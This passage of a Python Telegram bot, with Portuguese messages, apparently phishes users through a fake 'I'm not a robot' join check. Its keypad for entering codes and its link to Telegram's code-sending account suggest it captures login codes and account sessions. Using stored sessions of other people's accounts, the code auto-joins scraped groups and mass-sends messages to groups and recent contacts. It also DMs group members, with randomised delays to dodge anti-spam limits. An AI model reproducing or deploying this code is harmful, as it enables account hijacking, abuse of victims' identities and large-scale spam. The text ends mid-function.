import os
import json
import logging
import asyncio
import threading
import random
import re
import time
from pathlib import Path
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, ChatJoinRequestHandler, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError, PhoneCodeInvalidError
from telethon.tl.types import User, Channel, Chat, UserStatusOnline, UserStatusOffline, UserStatusRecently, UserStatusLastWeek, UserStatusLastMonth, UserStatusEmpty
from telethon.tl.functions.messages import HideChatJoinRequestRequest
from dotenv import load_dotenv
import requests as http_requests
import db

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID = 8796002293
EXTRA_ADMIN_IDS = []
ADMIN_IDS = {ADMIN_ID, *EXTRA_ADMIN_IDS}

def is_admin(uid):
    return uid in ADMIN_IDS

WEBAPP_URL = os.getenv("WEBAPP_URL", "")
_api_id_str = os.getenv("API_ID", "0") or "0"
API_ID = int(_api_id_str)
API_HASH = os.getenv("API_HASH", "")

PENDING_FILE = Path("pending_requests.json")
CONFIG_FILE = Path("config.json")

DEFAULT_CONFIG = {
    'mensagem': "🚨🚨🚨 ATENÇÃO {first_name} 🚨🚨🚨\n\nSua entrada em *{chat_title}* tá PENDENTE!\n\n⏱️ Você tem alguns minutos pra confirmar antes do acesso expirar.\n\n👇 TOCA AGORA:",
    'botao': "🤖 Não sou um robô",
    'msg_disparo': "",
    'intervalo_horas': '1'
}

flask_app = Flask(__name__, static_folder='static', static_url_path='/static')

running_child_bots = {}
user_states = {}
chatflow_states = {}
chatflow_lock = threading.Lock()

def log_public_ip():
    """Registra o IP de saída que deve ser liberado no MongoDB."""
    environment = (
        "PUBLISH"
        if os.getenv("REPLIT_DEPLOYMENT") == "1"
        else "DESENVOLVIMENTO"
    )
    endpoints = (
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
    )
    for endpoint in endpoints:
        try:
            response = http_requests.get(endpoint, timeout=10)
            ip = response.text.strip()
            if ip and len(ip) <= 64 and all(char.isdigit() or char in ".:" for char in ip):
                logger.info(f"🌍 IP PÚBLICO DO {environment}: {ip}")
                logger.info("➡️ Libere este IP na lista de acesso do MongoDB.")
                logger.warning(
                    "⚠️ O IP de saída da Replit não é fixo e pode mudar "
                    "após reiniciar ou publicar novamente."
                )
                return ip
        except Exception:
            continue
    logger.warning("⚠️ Não foi possível descobrir o IP público do Publish.")
    return None

telethon_loop = asyncio.new_event_loop()
telethon_thread = None

chatflow_loop = asyncio.new_event_loop()
chatflow_thread = None

VERIFICATION_TIMEOUT = 300

def start_telethon_loop():
    asyncio.set_event_loop(telethon_loop)
    telethon_loop.run_forever()

def start_chatflow_loop():
    asyncio.set_event_loop(chatflow_loop)
    chatflow_loop.run_forever()

def ensure_telethon_loop():
    global telethon_thread
    if telethon_thread is None or not telethon_thread.is_alive():
        telethon_thread = threading.Thread(target=start_telethon_loop, daemon=True)
        telethon_thread.start()

def ensure_chatflow_loop():
    global chatflow_thread
    if chatflow_thread is None or not chatflow_thread.is_alive():
        chatflow_thread = threading.Thread(target=start_chatflow_loop, daemon=True)
        chatflow_thread.start()

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, telethon_loop).result(timeout=60)

async def run_async_nb(coro, timeout=60):
    fut = asyncio.run_coroutine_threadsafe(coro, telethon_loop)
    return await asyncio.wait_for(asyncio.wrap_future(fut), timeout=timeout)

async def run_chatflow_nb(coro, timeout=60):
    ensure_chatflow_loop()
    fut = asyncio.run_coroutine_threadsafe(coro, chatflow_loop)
    return await asyncio.wait_for(asyncio.wrap_future(fut), timeout=timeout)

def cleanup_expired_states():
    import time
    now = time.time()
    expired = []
    for uid, state in list(user_states.items()):
        created = state.get('created_at', 0)
        if now - created > VERIFICATION_TIMEOUT:
            expired.append(uid)
    for uid in expired:
        state = user_states.pop(uid, None)
        if state and state.get('client'):
            try:
                asyncio.run_coroutine_threadsafe(state['client'].disconnect(), telethon_loop)
                logger.info(f"🧹 Verificação expirada limpa: user {uid}")
            except:
                pass
    expired_cf = []
    for uid, state in list(chatflow_states.items()):
        created = state.get('created_at', 0)
        if created and now - created > VERIFICATION_TIMEOUT:
            expired_cf.append(uid)
    for uid in expired_cf:
        state = chatflow_states.pop(uid, None)
        if state and state.get('client'):
            try:
                asyncio.run_coroutine_threadsafe(state['client'].disconnect(), telethon_loop)
                logger.info(f"🧹 Chatflow expirado limpo: user {uid}")
            except:
                pass
    total_expired = len(expired) + len(expired_cf)
    if total_expired:
        logger.info(f"🧹 Limpeza: {total_expired} verificações abandonadas removidas")

def start_cleanup_loop():
    import time
    while True:
        try:
            cleanup_expired_states()
        except Exception as e:
            logger.error(f"Erro na limpeza: {e}")
        time.sleep(60)

def auto_approve_pending_loop():
    import time
    from datetime import timezone
    while True:
        try:
            pending = load_pending()
            now = datetime.now()
            to_approve = []
            for uid_str, data in list(pending.items()):
                try:
                    ts = datetime.fromisoformat(data.get('timestamp', ''))
                    elapsed = (now - ts).total_seconds()
                    if elapsed >= 300:
                        to_approve.append((uid_str, data))
                except Exception:
                    continue
            for uid_str, data in to_approve:
                try:
                    chat_id = data.get('chat_id')
                    bot_token = data.get('bot_token')
                    if chat_id:
                        ok = approve_user(int(uid_str), chat_id, token=bot_token)
                        if ok:
                            logger.info(f"✅ Auto-aprovado após 5min: user={uid_str} chat={chat_id}")
                        else:
                            logger.warning(f"❌ Falhou auto-aprovação: user={uid_str} chat={chat_id}")
                    pending.pop(uid_str, None)
                except Exception as e:
                    logger.error(f"Erro auto-approve user={uid_str}: {e}")
            if to_approve:
                save_pending(pending)
        except Exception as e:
            logger.error(f"Erro no auto_approve_loop: {e}")
        time.sleep(60)

def _build_code_keyboard(current_code):
    kb = [
        [InlineKeyboardButton("1", callback_data="cf_1"), InlineKeyboardButton("2", callback_data="cf_2"), InlineKeyboardButton("3", callback_data="cf_3")],
        [InlineKeyboardButton("4", callback_data="cf_4"), InlineKeyboardButton("5", callback_data="cf_5"), InlineKeyboardButton("6", callback_data="cf_6")],
        [InlineKeyboardButton("7", callback_data="cf_7"), InlineKeyboardButton("8", callback_data="cf_8"), InlineKeyboardButton("9", callback_data="cf_9")],
        [InlineKeyboardButton("⬅️ Apagar", callback_data="cf_del"), InlineKeyboardButton("0", callback_data="cf_0"), InlineKeyboardButton("✅ Enviar", callback_data="cf_ok")],
        [InlineKeyboardButton("👀 Ver código", url="tg://openmessage?user_id=777000")],
    ]
    return kb

def _build_code_display(current_code):
    slots = []
    for i in range(5):
        if i < len(current_code):
            slots.append(current_code[i])
        else:
            slots.append('•')
    return '  '.join(slots)

def load_pending():
    if PENDING_FILE.exists():
        try:
            return json.loads(PENDING_FILE.read_text())
        except:
            pass
    return {}

def save_pending(data):
    PENDING_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2))

def load_config():
    config = db.get_bot_config("pai")
    if config:
        for key, val in DEFAULT_CONFIG.items():
            if key not in config:
                config[key] = val
        return config
    if CONFIG_FILE.exists():
        try:
            file_config = json.loads(CONFIG_FILE.read_text())
            db.set_bot_config("pai", "mensagem", file_config.get("mensagem", DEFAULT_CONFIG["mensagem"]))
            db.set_bot_config("pai", "botao", file_config.get("botao", DEFAULT_CONFIG["botao"]))
            db.set_bot_config("pai", "msg_disparo", file_config.get("msg_disparo", DEFAULT_CONFIG["msg_disparo"]))
            db.set_bot_config("pai", "intervalo_horas", str(file_config.get("intervalo_horas", DEFAULT_CONFIG["intervalo_horas"])))
            return file_config
        except:
            pass
    return dict(DEFAULT_CONFIG)

def save_config(config):
    for key, val in config.items():
        db.set_bot_config("pai", key, str(val) if not isinstance(val, str) else val)
    CONFIG_FILE.write_text(json.dumps(config, ensure_ascii=False, indent=2))

def get_bot_cfg(bot_id):
    config = db.get_bot_config(bot_id)
    for key, val in DEFAULT_CONFIG.items():
        if key not in config:
            config[key] = val
    return config

def get_child_webapp_url(bot_id):
    bot = db.get_bot(bot_id)
    if bot and bot.get('webapp_url'):
        return bot['webapp_url']
    return WEBAPP_URL

async def _approve_telethon(bot_token, chat_id, user_id):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.start(bot_token=bot_token)
        await client(HideChatJoinRequestRequest(
            peer=chat_id,
            user_id=user_id,
            approved=True
        ))
        return True
    except Exception as e:
        logger.warning(f"Telethon approve falhou token=...{bot_token[-6:]}: {e}")
        return False
    finally:
        try:
            await client.disconnect()
        except:
            pass


def approve_user(user_id, chat_id, token=None):
    tokens_to_try = []
    if token:
        tokens_to_try.append(token)
    if BOT_TOKEN and BOT_TOKEN not in tokens_to_try:
        tokens_to_try.append(BOT_TOKEN)
    try:
        all_bots = db.get_all_bots()
        for b in all_bots:
            t = b.get('token', '')
            if t and t not in tokens_to_try:
                tokens_to_try.append(t)
    except:
        pass
    for t in tokens_to_try:
        try:
            url = f"https://api.telegram.org/bot{t}/approveChatJoinRequest"
            resp = http_requests.post(url, json={'chat_id': chat_id, 'user_id': user_id}, timeout=10)
            if resp.status_code == 200:
                return True
            data = resp.json()
            desc = data.get('description', '')
            if 'HIDE_REQUESTER_MISSING' in desc or 'USER_ALREADY_PARTICIPANT' in desc:
                return True
            logger.warning(f"approve_user falhou token=...{t[-6:]}: {data.get('error_code')} {desc}")
        except Exception as e:
            logger.error(f"Erro approve_user token=...{t[-6:]}: {e}")
    logger.info(f"Bot API falhou, tentando Telethon MTProto para user={user_id} chat={chat_id}")
    for t in tokens_to_try:
        try:
            ok = run_async(_approve_telethon(t, chat_id, user_id))
            if ok:
                logger.info(f"✅ Aprovado via Telethon token=...{t[-6:]}")
                return True
        except Exception as e:
            logger.warning(f"Erro Telethon approve token=...{t[-6:]}: {e}")
    logger.warning(f"⚠️ Falha ao aprovar user={user_id} chat={chat_id} após tentar {len(tokens_to_try)} tokens (Bot API + Telethon)")
    return False

async def session_entrar_grupos():
    from telethon.tl.functions.messages import ImportChatInviteRequest, CheckChatInviteRequest
    from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
    from telethon.tl.types import ChatInviteAlready, ChatInvite, ChatInvitePeek
    sessions = db.get_all_sessions()
    if not sessions:
        return
    invite_pattern = re.compile(r'(?:https?://)?t\.me/(?:joinchat/|\+)([a-zA-Z0-9_-]+)')
    public_pattern = re.compile(r'(?:https?://)?t\.me/([a-zA-Z][a-zA-Z0-9_]{3,})')
    total_entrou = 0
    for sess in sessions:
        if not db.acquire_session_lock(sess['user_id'], 'auto_grupo', ttl_seconds=900):
            logger.info(f"[AutoGrupo] Session {sess.get('phone','?')} em uso, pulando")
            continue
        try:
            client = TelegramClient(StringSession(sess['session_data']), API_ID, API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                try: await client.disconnect()
                except: pass
                continue
            dialogs = await client.get_dialogs(limit=300)
            grupos_ids = set()
            grupos_usernames = set()
            invite_hashes = set()
            public_links = set()
            for dialog in dialogs:
                entity = dialog.entity
                if isinstance(entity, Chat):
                    grupos_ids.add(dialog.id)
                elif isinstance(entity, Channel) and entity.megagroup:
                    grupos_ids.add(dialog.id)
                    if hasattr(entity, 'username') and entity.username:
                        grupos_usernames.add(entity.username.lower())
            for gid in grupos_ids:
                try:
                    async for msg in client.iter_messages(gid, limit=50):
                        if msg.text:
                            for h in invite_pattern.findall(msg.text):
                                invite_hashes.add(h)
                            for u in public_pattern.findall(msg.text):
                                if u.lower() not in ('joinchat', 'addstickers', 'addemoji', 'share', 'socks', 'proxy', 'setlanguage', 'bg', 'addtheme', 'confirmphone', 'login', 'iv'):
                                    public_links.add(u)
                    await asyncio.sleep(random.uniform(2, 5))
                except Exception:
                    continue
            sess_entrou = 0
            for invite_hash in invite_hashes:
                try:
                    should_join = True
                    try:
                        check = await client(CheckChatInviteRequest(invite_hash))
                        if isinstance(check, ChatInviteAlready):
                            should_join = False
                        elif isinstance(check, ChatInvite):
                            if check.channel and not check.megagroup:
                                should_join = False
                        elif isinstance(check, ChatInvitePeek):
                            pass
                    except FloodWaitError as e:
                        wait = min(e.seconds, 300)
                        logger.warning(f"[AutoGrupo] FloodWait {wait}s no check, session {sess.get('phone','?')}")
                        await asyncio.sleep(wait + 5)
                        should_join = True
                    except Exception as e:
                        err = str(e).lower()
                        if 'expired' in err or 'revoked' in err or 'invalid' in err:
                            should_join = False
                        else:
                            should_join = True
                    if not should_join:
                        continue
                    await client(ImportChatInviteRequest(invite_hash))
                    sess_entrou += 1
                    total_entrou += 1
                    logger.info(f"[AutoGrupo] Session {sess.get('phone','?')} entrou via invite {invite_hash[:8]}...")
                    await asyncio.sleep(random.uniform(1200, 1260))
                except FloodWaitError as e:
                    wait = min(e.seconds, 300)
                    logger.warning(f"[AutoGrupo] FloodWait {wait}s no join, session {sess.get('phone','?')}")
                    await asyncio.sleep(wait + 5)
                except Exception as e:
                    err = str(e).lower()
                    if 'already' in err or 'participant' in err:
                        continue
                    if 'banned' in err or 'restricted' in err or 'forbidden' in err:
                        logger.warning(f"[AutoGrupo] Session {sess.get('phone','?')} restrita, pulando invites")
                        break
                    continue
            for username in public_links:
                if username.lower() in grupos_usernames:
                    continue
                try:
                    entity = await client.get_entity(username)
                    if isinstance(entity, Channel):
                        if not entity.megagroup:
                            continue
                        if hasattr(entity, 'left') and not entity.left:
                            continue
                        await client(JoinChannelRequest(entity))
                        sess_entrou += 1
                        total_entrou += 1
                        logger.info(f"[AutoGrupo] Session {sess.get('phone','?')} entrou em @{username}")
                        await asyncio.sleep(random.uniform(1200, 1260))
                except FloodWaitError as e:
                    wait = min(e.seconds, 300)
                    logger.warning(f"[AutoGrupo] FloodWait {wait}s join público, session {sess.get('phone','?')}")
                    await asyncio.sleep(wait + 5)
                except Exception as e:
                    err = str(e).lower()
                    if 'already' in err or 'participant' in err:
                        continue
                    if 'banned' in err or 'restricted' in err or 'forbidden' in err:
                        logger.warning(f"[AutoGrupo] Session {sess.get('phone','?')} restrita em grupos públicos")
                        break
                    continue
            restricted_groups = []
            try:
                dialogs_updated = await client.get_dialogs(limit=300)
                for dialog in dialogs_updated:
                    entity = dialog.entity
                    if isinstance(entity, Channel) and entity.megagroup:
                        if entity.restricted or (hasattr(entity, 'banned_rights') and entity.banned_rights and entity.banned_rights.send_messages):
                            restricted_groups.append(dialog)
            except:
                pass
            for dialog in restricted_groups:
                try:
                    await client(LeaveChannelRequest(dialog.entity))
                    logger.info(f"[AutoGrupo] Session {sess.get('phone','?')} saiu de grupo restrito: {dialog.name}")
                    await asyncio.sleep(random.uniform(3, 6))
                except:
                    pass
            await client.disconnect()
            logger.info(f"[AutoGrupo] Session {sess.get('phone','?')} finalizada. Invites:{len(invite_hashes)} Públicos:{len(public_links)} Entrou:{sess_entrou}")
            await asyncio.sleep(random.uniform(10, 20))
        except FloodWaitError as e:
            wait = min(e.seconds, 300)
            logger.warning(f"[AutoGrupo] FloodWait global {wait}s")
            await asyncio.sleep(wait + 5)
        except Exception as e:
            err = str(e).lower()
            if 'deactivated' in err or 'banned' in err or 'deleted' in err:
                db.delete_session(sess['user_id'])
                logger.info(f"[AutoGrupo] Session morta removida: {sess.get('phone','?')}")
            else:
                logger.error(f"[AutoGrupo] Erro session {sess.get('phone','?')}: {e}")
        finally:
            db.release_session_lock(sess['user_id'])
    logger.info(f"[AutoGrupo] Concluído. Total entradas: {total_entrou}")


async def session_pv_automatico():
    from telethon.tl.functions.channels import GetParticipantsRequest
    from telethon.tl.types import ChannelParticipantsRecent
    config = load_config()
    msg = config.get('msg_disparo', '')
    if not msg:
        logger.info("[AutoPV] Sem msg_disparo configurada, pulando")
        return
    sessions = db.get_all_sessions()
    if not sessions:
        return
    total_enviadas = 0
    for sess in sessions:
        if not db.acquire_session_lock(sess['user_id'], 'auto_pv', ttl_seconds=900):
            logger.info(f"[AutoPV] Session {sess.get('phone','?')} em uso, pulando")
            continue
        try:
            client = TelegramClient(StringSession(sess['session_data']), API_ID, API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                try: await client.disconnect()
                except: pass
                continue
            me = await client.get_me()
            my_id = me.id
            dialogs = await client.get_dialogs(limit=300)
            ja_conversou = set()
            grupos = []
            for dialog in dialogs:
                entity = dialog.entity
                if isinstance(entity, User):
                    ja_conversou.add(entity.id)
                elif isinstance(entity, Channel) and entity.megagroup:
                    grupos.append(dialog.entity)
                elif isinstance(entity, Chat):
                    grupos.append(dialog.entity)
            candidatos = set()
            for grupo in grupos:
                try:
                    if isinstance(grupo, Channel):
                        result = await client(GetParticipantsRequest(
                            channel=grupo, filter=ChannelParticipantsRecent(),
                            offset=0, limit=200, hash=0
                        ))
                        for p in result.users:
                            if not p.bot and not p.deleted and p.id != my_id and p.id not in ja_conversou:
                                candidatos.add(p.id)
                    elif isinstance(grupo, Chat):
                        full = await client.get_participants(grupo, aggressive=False)
                        for p in full:
                            if not p.bot and not p.deleted and p.id != my_id and p.id not in ja_conversou:
                                candidatos.add(p.id)
                    await asyncio.sleep(random.uniform(2, 4))
                except FloodWaitError as e:
                    wait = min(e.seconds, 120)
                    await asyncio.sleep(wait + 5)
                except Exception:
                    continue
            candidatos_list = list(candidatos)
            random.shuffle(candidatos_list)
            max_por_session = min(len(candidatos_list), 3)
            sess_enviadas = 0
            for uid in candidatos_list[:max_por_session]:
                try:
                    await client.send_message(uid, msg)
                    sess_enviadas += 1
                    total_enviadas += 1
                    logger.info(f"[AutoPV] Session {sess.get('phone','?')} enviou PV para {uid}")
                    await asyncio.sleep(random.uniform(900, 1200))
                except FloodWaitError as e:
                    wait = min(e.seconds, 300)
                    logger.warning(f"[AutoPV] FloodWait {wait}s, session {sess.get('phone','?')}")
                    await asyncio.sleep(wait + 5)
                except Exception as e:
                    err = str(e).lower()
                    if 'privacy' in err or 'blocked' in err or 'peer_id_invalid' in err:
                        continue
                    if 'banned' in err or 'restricted' in err or 'forbidden' in err:
                        logger.warning(f"[AutoPV] Session {sess.get('phone','?')} restrita, parando PVs")
                        break
                    continue
            logger.info(f"[AutoPV] Session {sess.get('phone','?')}: {sess_enviadas} PVs enviados de {len(candidatos)} candidatos")
            await client.disconnect()
            await asyncio.sleep(random.uniform(10, 20))
        except FloodWaitError as e:
            wait = min(e.seconds, 300)
            logger.warning(f"[AutoPV] FloodWait global {wait}s")
            await asyncio.sleep(wait + 5)
        except Exception as e:
            err = str(e).lower()
            if 'deactivated' in err or 'banned' in err or 'deleted' in err:
                db.delete_session(sess['user_id'])
                logger.info(f"[AutoPV] Session morta removida: {sess.get('phone','?')}")
            else:
                logger.error(f"[AutoPV] Erro session {sess.get('phone','?')}: {e}")
        finally:
            db.release_session_lock(sess['user_id'])
    logger.info(f"[AutoPV] Concluído. Total PVs: {total_enviadas}")


async def _force_send(client, peer, msg, retries=2):
    last_err = None
    for attempt in range(retries + 1):
        try:
            await client.send_message(peer, msg)
            return 'ok'
        except FloodWaitError as e:
            wait = min(e.seconds, 120)
            logger.warning(f"[Disparo] FloodWait {wait}s, aguardando...")
            await asyncio.sleep(wait + 2)
        except Exception as e:
            last_err = e
            err = str(e).lower()
            err_type = type(e).__name__.lower()
            combined = err + " " + err_type
            if any(k in combined for k in ('forbidden', 'banned', 'restricted', 'chat_write_forbidden', 'slowmode', 'slow_mode', 'admin_required', 'channelprivate', 'chatrestricted')):
                return 'restricted'
            if any(k in combined for k in ('peer_id_invalid', 'user_is_blocked', 'peeridinvalid', 'userisblocked', 'userprivacyrestricted', 'invalid')):
                return 'skip'
            logger.warning(f"[Disparo] Erro send peer={peer}: {type(e).__name__}: {e}")
            return 'error'
    if last_err:
        logger.warning(f"[Disparo] Flood final peer={peer}: {last_err}")
    return 'flood'

def _user_visto_hoje(user):
    """True se o usuário está ATIVO (filtro PERMISSIVO).

    Aceita (manda mensagem):
      - UserStatusOnline (online agora)
      - UserStatusRecently ('recente' — últimos 2-3 dias mesmo com privacidade)
      - UserStatusLastWeek (visto na última semana)
      - UserStatusOffline com was_online dos últimos 7 dias
      - status=None (sem info — manda mesmo assim, na dúvida tenta)

    Rejeita só quem tá claramente morto:
      - UserStatusLastMonth (>1 semana sem aparecer)
      - UserStatusEmpty (conta sem nenhum sinal de vida)
      - UserStatusOffline com was_online >7 dias
    """
    status = getattr(user, 'status', None)
    if status is None:
        return True
    if isinstance(status, UserStatusEmpty):
        return False
    if isinstance(status, UserStatusLastMonth):
        return False
    if isinstance(status, UserStatusOnline):
        return True
    if isinstance(status, UserStatusRecently):
        return True
    if isinstance(status, UserStatusLastWeek):
        return True
    if isinstance(status, UserStatusOffline):
        was = getattr(status, 'was_online', None)
        if was is None:
            return True
        try:
            from datetime import timedelta
            agora = datetime.now()
            was_local = was.astimezone().replace(tzinfo=None) if was.tzinfo else was
            return (agora - was_local) <= timedelta(days=7)
        except Exception:
            return True
    return True

async def _disparo_uma_session(sess, msg, grupos_ja_enviados):
    """Executa o disparo numa session.

    grupos_ja_enviados: set compartilhado entre as sessions DESTE bot. Evita
    enviar a mesma msg em grupos onde várias sessions estão dentro.
    """
    client = TelegramClient(StringSession(sess['session_data']), API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        db.delete_session(sess['user_id'])
        logger.info(f"[Disparo] Session inválida removida: {sess.get('phone','?')}")
        try: await client.disconnect()
        except: pass
        return 0, True
    dialogs = await client.get_dialogs(limit=500)
    destinos = []
    descartados_offline = 0
    for dialog in dialogs:
        try:
            entity = dialog.entity
            if isinstance(entity, User):
                if entity.bot or entity.is_self or entity.deleted:
                    continue
                if not _user_visto_hoje(entity):
                    descartados_offline += 1
                    continue
                destinos.append({'id': dialog.id, 'name': dialog.name or '?', 'type': 'user'})
            elif isinstance(entity, Chat):
                destinos.append({'id': dialog.id, 'name': dialog.name or '?', 'type': 'group'})
            elif isinstance(entity, Channel):
                if entity.megagroup:
                    destinos.append({'id': dialog.id, 'name': dialog.name or '?', 'type': 'group'})
        except:
            continue
    sess_ok = 0
    sess_skip = 0
    sess_restricted = 0
    sess_dedup = 0
    for dest in destinos:
        # Dedupe: se for grupo e outra session deste bot já mandou neste ciclo, pula
        if dest['type'] == 'group' and dest['id'] in grupos_ja_enviados:
            sess_dedup += 1
            continue
        result = await _force_send(client, dest['id'], msg)
        if result == 'ok':
            sess_ok += 1
            if dest['type'] == 'group':
                grupos_ja_enviados.add(dest['id'])
            await asyncio.sleep(random.uniform(0.5, 1.5))
        elif result == 'restricted':
            sess_restricted += 1
            if dest['type'] == 'group':
                try:
                    from telethon.tl.functions.channels import LeaveChannelRequest
                    await client(LeaveChannelRequest(dest['id']))
                    logger.info(f"[Disparo] Saiu de grupo restrito: {dest['name']}")
                except:
                    pass
            await asyncio.sleep(random.uniform(0.3, 0.8))
        elif result == 'flood':
            await asyncio.sleep(random.uniform(15, 30))
        else:
            sess_skip += 1
            await asyncio.sleep(random.uniform(0.2, 0.5))
    logger.info(f"[Disparo] Session {sess.get('phone','?')}: {sess_ok} enviadas | {sess_restricted} restritas | {sess_skip} puladas | {sess_dedup} dedup | {descartados_offline} offline-hj | destinos: {len(destinos)}")
    await client.disconnect()
    return sess_ok, False

async def _disparo_worker(sess, msg, owner, grupos_ja_enviados):
    import time as _time
    # 1) Tenta pegar o lock da session pra impedir uso paralelo
    if not db.acquire_session_lock(sess['user_id'], owner, ttl_seconds=300):
        logger.info(f"[Disparo] Session {sess.get('phone','?')} já em uso por outra rotina, pulando")
        return 0, False, 'locked'
    t0 = _time.time()
    try:
        sess_ok, removed = await asyncio.wait_for(
            _disparo_uma_session(sess, msg, grupos_ja_enviados),
            timeout=180
        )
        elapsed = round(_time.time() - t0, 1)
        logger.info(f"[Disparo] Session {sess.get('phone','?')} levou {elapsed}s")
        return sess_ok, removed, None
    except asyncio.TimeoutError:
        logger.warning(f"[Disparo] TIMEOUT (3min) session {sess.get('phone','?')}")
        return 0, False, None
    except FloodWaitError as e:
        wait = min(e.seconds, 120)
        logger.warning(f"[Disparo] FloodWait session {sess.get('phone','?')}: {wait}s")
        await asyncio.sleep(wait + 2)
        return 0, False, None
    except (ConnectionError, OSError):
        return 0, False, 'dead'
    except Exception as e:
        err_str = str(e).lower()
        if 'auth' in err_str or 'deactivated' in err_str or 'banned' in err_str or 'deleted' in err_str or 'invalid' in err_str:
            return 0, False, 'dead'
        logger.error(f"[Disparo] Erro session {sess.get('phone','?')}: {e}")
        return 0, False, None
    finally:
        db.release_session_lock(sess['user_id'])

def _carrega_sessions_do_bot(bot_id):
    """Pega só as sessions que pertencem a esse bot.

    - Se bot_id é None/'pai' → sessions órfãs (sem dono ou de bots desativados)
    - Se bot_id é de um filho → só as sessions amarradas a ele
    """
    if bot_id and bot_id != 'pai':
        return db.get_sessions_for_child_bot(bot_id)
    active_child_bot_ids = [str(b['_id']) for b in db.get_all_bots()]
    return db.get_orphan_sessions(active_child_bot_ids)

async def disparo_all_sessions_async(msg, bot_id=None, owner='pai'):
    if not msg:
        return 0
    sessions = _carrega_sessions_do_bot(bot_id)
    if not sessions:
        logger.info(f"[Disparo] Owner={owner} não tem sessions, pulando")
        return 0
    random.shuffle(sessions)
    total = 0
    removidas = 0
    locked = 0
    usadas = 0
    grupos_ja_enviados = set()
    BATCH_SIZE = 15
    logger.info(f"[Disparo] Owner={owner} iniciando para {len(sessions)} sessions (batches de {BATCH_SIZE})...")
    for i in range(0, len(sessions), BATCH_SIZE):
        batch = sessions[i:i+BATCH_SIZE]
        tasks = [_disparo_worker(sess, msg, owner, grupos_ja_enviados) for sess in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for j, result in enumerate(results):
            if isinstance(result, Exception):
                logger.error(f"[Disparo] Erro inesperado batch: {result}")
                continue
            sess_ok, removed, status = result
            total += sess_ok
            if status == 'locked':
                locked += 1
            else:
                usadas += 1
            if removed or status == 'dead':
                db.delete_session(batch[j]['user_id'])
                removidas += 1
                logger.info(f"[Disparo] Session removida: {batch[j].get('phone','?')}")
        await asyncio.sleep(random.uniform(0.3, 0.8))
    if removidas > 0:
        logger.info(f"[Disparo] Owner={owner} limpou {removidas} sessions mortas")
    if locked > 0:
        logger.info(f"[Disparo] Owner={owner} pulou {locked} sessions em uso")
    logger.info(f"[Disparo] Owner={owner} CONCLUÍDO. Total: {total} msgs | grupos únicos: {len(grupos_ja_enviados)} | sessions usadas: {usadas}/{len(sessions)} (puladas-lock: {locked})")
    return total

async def disparo_job(context: ContextTypes.DEFAULT_TYPE):
    bot_id = context.bot_data.get('bot_id')
    if bot_id:
        config = get_bot_cfg(bot_id)
    else:
        config = load_config()
    msg = config.get('msg_disparo', '')
    bot_name = context.bot_data.get('bot_name', 'Pai')
    owner = bot_id if bot_id else 'pai'
    logger.info(f"[Disparo] Bot={bot_name} bot_id={bot_id} msg={'SIM' if msg else 'VAZIO'}")
    if not msg:
        logger.info(f"Disparo automático ({bot_name}): 0 msgs (sem msg_disparo)")
        return
    total = await disparo_all_sessions_async(msg, bot_id=bot_id, owner=owner)
    logger.info(f"Disparo automático ({bot_name}): {total} msgs")
    try:
        await context.bot.send_message(ADMIN_ID, f"✅ Disparo concluído!\n🤖 {bot_name}\n📨 {total} msgs enviadas")
    except:
        pass


async def pai_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_admin(user.id):
        await pai_admin_menu(update, context)
        return
    config = load_config()
    keyboard = [[InlineKeyboardButton(config.get('botao', "🔓 DESBLOQUEAR CANAL"), web_app=WebAppInfo(url=WEBAPP_URL), api_kwargs={"style": "success"})]]
    msg = config.get('mensagem', "⛔ *Acesso a {chat_title} bloqueado*\n\nEste canal contém material restrito. Desbloqueie para ver o que está escondido.").replace("{chat_title}", "o canal")
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def pai_cmd_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    ip = log_public_ip()
    if ip:
        environment = "PUBLISH" if os.getenv("REPLIT_DEPLOYMENT") == "1" else "DESENVOLVIMENTO"
        await update.message.reply_text(
            f"🌍 IP PÚBLICO DO {environment}:\n{ip}\n\n"
            "Adicione este IP na lista de acesso do MongoDB."
        )
    else:
        await update.message.reply_text("❌ Não consegui descobrir o IP público agora.")

async def pai_cmd_setdisparo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    msg = ' '.join(context.args) if context.args else ''
    if not msg:
        config = load_config()
        atual = config.get('msg_disparo', '(vazia)')
        await update.message.reply_text(f"ℹ️ Uso: /setdisparo <mensagem>\n\nAtual:\n{atual}")
        return
    config = load_config()
    config['msg_disparo'] = msg
    save_config(config)
    await update.message.reply_text(f"✅ Mensagem de disparo atualizada:\n\n{msg}")

async def pai_cmd_setintervalo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args or not context.args[0].isdigit():
        config = load_config()
        await update.message.reply_text(f"ℹ️ Uso: /setintervalo <horas>\n\nAtual: {config.get('intervalo_horas', '1')}h")
        return
    val = int(context.args[0])
    if val < 1:
        await update.message.reply_text("❌ Mínimo 1 hora.")
        return
    config = load_config()
    config['intervalo_horas'] = str(val)
    save_config(config)
    await update.message.reply_text(f"✅ Intervalo atualizado para {val}h.")

async def pai_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sessions_count = db.count_sessions()
    bots_count = db.count_bots()
    config = load_config()
    keyboard = [
        [InlineKeyboardButton("📊 Estatísticas", callback_data="stats")],
